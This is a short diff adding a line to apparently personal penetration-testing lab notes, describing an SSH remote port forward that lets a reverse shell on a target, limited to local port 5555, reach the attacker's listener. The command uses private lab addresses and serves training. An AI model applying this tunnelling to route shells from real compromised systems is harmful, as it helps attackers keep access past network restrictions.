@@ -69,3 +69,7 @@ ss -antp | grep "2221"
 sudo nmap -sS -sV 127.0.0.1 -p 2221
 ```  
 
+If we have a rev shell on the target that can only access local 5555, we can set up a remote tunnel FROM ATTACKING MACHINE.  
+
+`ssh -N -R 127.0.0.1:5555:192.168.119.171:4444 student@192.168.171.52 -p 2222`  
+
